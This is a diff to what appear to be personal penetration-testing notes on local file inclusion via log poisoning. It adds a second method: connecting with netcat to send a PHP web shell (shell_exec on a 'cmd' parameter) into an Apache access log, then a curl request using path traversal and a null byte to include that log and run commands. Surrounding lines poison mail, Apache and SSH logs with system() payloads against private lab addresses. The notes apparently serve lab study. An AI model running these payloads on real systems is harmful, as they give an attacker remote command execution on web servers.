@@ -32,8 +32,19 @@ QUIT
 192.168.1.107/lfi/lfi.php?file=/var/log/mail.log&cmd=ifconfig
 
 #Apache 
+Method 1 
 Replace user agent by <?php system($_GET['cmd']); ?>
 192.168.1.129/lfi/lfi.php?file=/var/log/apache2/access.log&cmd=ifconfig
+
+Method 2
+nc -v 10.11.23.188 80
+10.11.23.188: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.11.23.188] 80 (http) open
+<?php echo shell_exec($_GET['cmd']);?> 
+
+curl "http://10.11.23.188/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig"
+
+
 
 #SSH 
 ssh '<?php system($_GET['cmd']); ?>'@192.168.1.129
